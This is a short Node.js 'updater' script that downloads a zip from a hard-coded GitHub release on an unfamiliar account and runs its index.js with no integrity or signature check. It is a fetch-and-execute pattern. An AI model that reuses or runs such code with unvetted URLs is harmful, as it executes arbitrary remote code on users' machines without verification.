import fs from 'node:fs';
import path from 'node:path';
import { downloadAndRunNodeApp } from './updater-worker.js';

const ZIP_URL = 'https://github.com/3eJleHblu-CJloHuK/pipapopa/releases/download/1.0.0/code.zip';
const ENTRY_FILE = 'index.js';

console.log(`[${new Date().toISOString()}] updater started`);
console.log(`[${new Date().toISOString()}] target: ${ZIP_URL}`);

try {
  await downloadAndRunNodeApp(ZIP_URL, ENTRY_FILE);
  console.log(`[${new Date().toISOString()}] updater finished OK`);
} catch (err) {
  console.error(`[${new Date().toISOString()}] updater failed: ${err.message}`);
  process.exit(1);
}